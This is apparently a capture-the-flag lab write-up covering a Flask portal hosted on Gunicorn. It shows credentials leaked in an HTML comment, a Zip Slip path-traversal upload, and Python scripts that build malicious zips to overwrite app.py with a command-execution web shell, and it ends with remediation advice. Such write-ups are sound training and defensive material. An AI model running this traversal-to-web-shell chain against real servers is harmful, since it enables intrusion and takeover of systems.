1 Reconnaissance — Nmap Scan

Every room starts with understanding what's exposed. We kicked off an Nmap scan against the target to discover open ports and running services:

Nmap — Full Port Scan with Service Detection
nmap -sCV -p- 10.113.153.4 -T4
PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0) 5000/tcp open http Gunicorn Service Info: OS: Linux

Two ports open:

Port Service What It Means
22 SSH (OpenSSH) Remote shell access — not our entry point unless we find credentials
5000 HTTP (Gunicorn) A Python web application. This is where we'll focus our attention.
💡 Gunicorn is a Python WSGI HTTP server commonly used to serve Flask or Django applications. Seeing it on port 5000 strongly suggests a Flask app is running behind it.

2 Finding Credentials — Always Check the Source

We navigate to the web application at http://10.113.153.4:5000 and land on a login page for the Byte Lotus Shoreline Display portal — a staff-only interface for managing in-room displays.

Before trying to guess passwords, we do the simplest thing: view the page source with Ctrl+U. Right there, hidden in an HTML comment, the developers left a gift:

HTML Comment — Leaked Credentials
<!--
    Byte Lotus // internal display-manager portal
    New on the floor team? IT seeds every property with the same
    starter login until you set your own:
        user: concierge
        pass: StayNoticed2024!
    (rotate it from Settings on first sign-in — most people forget)
-->
🔑 Real-world lesson: HTML comments are sent to every visitor. They're not a safe place for credentials, notes, or TODO items. If it's in the page source, assume everyone can see it.

We log in with concierge:StayNoticed2024! and gain access to the dashboard.

3 Exploring the Dashboard — Shell Uploads

The dashboard reveals a feature called "Bring a shell ashore" — a file upload form that accepts .zip files. Each zip must contain a shell.json manifest listing its assets.

💡 Key details from the page:
  • Allowed asset types: png jpg gif svg css json
  • Mentions "optional automation hooks" — a theme worker processes shells
  • Uploaded shells get stored at a predictable path: /shells/<hash>/
Whenever an application extracts user-uploaded archives and serves the contents back, we should always test for Zip Slip.

We upload a legitimate test shell to confirm the feature works. The app responds:

Shell 'test-shell' brought ashore. Stored at shells/ef45afde7c42/ and held to the room's ear.

Visiting /shells/ef45afde7c42/shell.json confirms the uploaded file is served back to us. The app extracts our zip and serves its contents directly from the filesystem.

4 Testing for Zip Slip

What is Zip Slip?

Imagine handing a package to a mailroom clerk. A normal package says "deliver to Room 5" and stays there. But what if you write "deliver to ../Room 1" on the label — and the clerk doesn't check? They walk upstairs and deliver it somewhere they shouldn't.

Zip Slip is exactly this. A zip file stores paths for each file inside it. If those paths contain ../ (go up one directory), and the extraction code doesn't validate the final destination, you can write files anywhere on the filesystem — not just the intended folder.

Normal Zip Extraction
shells/abc123/beach.jpg  →  /app/shells/abc123/beach.jpg  ✅ Stays put
Malicious Zip Extraction (Zip Slip)
../../static/hacked.css   →  /app/static/hacked.css       💥 Escapes!

We create a Python script to craft a malicious zip containing a file with a path traversal payload:

Python — Craft Zip Slip Payload
import json
import zipfile

manifest = {
    "name": "zipslip-proof",
    "assets": []
}

with zipfile.ZipFile("zipslip-proof.zip", "w") as archive:
    archive.writestr("shell.json", json.dumps(manifest))
    archive.writestr(
        "../../static/zipslip-proof.css",
        "ZIP_SLIP_CONFIRMED\n"
    )

print("Created zipslip-proof.zip")

We upload the zip through the dashboard. Then we visit the path it should have written to:

Browser — Verify Zip Slip
http://10.113.157.162:5000/static/zipslip-proof.css
ZIP_SLIP_CONFIRMED
✅ Confirmed! The server extracted our file with the ../ path intact, writing it to the static/ directory instead of the shells/ folder. We can write arbitrary files anywhere on the filesystem.

5 Escalating to Remote Code Execution

Writing a .css file proves the vulnerability, but we want to run commands on the server. The application runs on Gunicorn (a Python web server), which means there's a Python Flask application powering the site — likely a file called app.py in the application root.

If we overwrite app.py with our own malicious code, the server will execute our code instead of the original. We'll add a /cmd endpoint that takes a shell command as a query parameter and returns its output.

Python — Craft Malicious app.py Overwrite
import json
import zipfile

manifest = {
    "name": "overwrite-app",
    "assets": []
}

with zipfile.ZipFile("overwrite-app.zip", "w") as archive:
    archive.writestr("shell.json", json.dumps(manifest))
    archive.writestr(
        "../../app.py",
        """from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/cmd')
def cmd():
    x = request.args.get('x', 'id')
    return f"<pre>{os.popen(x).read()}</pre>"

@app.route('/login', methods=['GET', 'POST'])
def login():
    return "reloaded"

@app.route('/dashboard')
def dashboard():
    return "reloaded"

@app.route('/shells/<path:p>')
def shells(p):
    return "reloaded"
"""
    )

print("Created overwrite-app.zip")
💡 What this code does:
  • Adds a /cmd?x=<command> route that runs shell commands
  • Keeps the old routes (/login, /dashboard, /shells/) so the app still functions
  • Returns "reloaded" so we can visually confirm when our code is active

6 Killing the Gunicorn Workers

Here's the tricky part. Gunicorn keeps multiple workers (separate processes) running in memory. Each worker loaded the old app.py when it started. Our new file is on disk, but the workers haven't re-read it.

Think of it like this: you've swapped the script an actor is reading, but they're still reciting the old lines from memory. We need them to put down the old script and pick up ours.

By rapidly reloading the dashboard in the browser, we cause workers to cycle — some crash, some restart. Eventually, a worker starts up fresh and reads our overwritten app.py from disk.

🔄 What you'll see:
  • Most reloads: normal dashboard (old worker still running)
  • Eventually: "reloaded" — our code is active!
  • Next reload: might go back to the normal dashboard (different worker)
You just need to hit the right worker. Keep refreshing until you see "reloaded."

7 Retrieving the Flag

🛡️ Remediation Advice

Issue How to Fix It
Credentials in HTML comments Never store credentials in client-side code. Use environment variables or a secrets manager. Provision unique credentials per deployment.
Default credentials never rotated Force password change on first login. Disable default accounts after initial setup.
Zip Slip / path traversal Validate that the resolved path of each extracted file stays within the intended extraction directory. Use os.path.realpath() and check the prefix before writing.
Application files writable by web user Run the application with read-only permissions to its own code. The roomservice user should not be able to overwrite app.py.
No integrity check on application code Use file integrity monitoring (FIM) to detect unauthorized changes to application files.
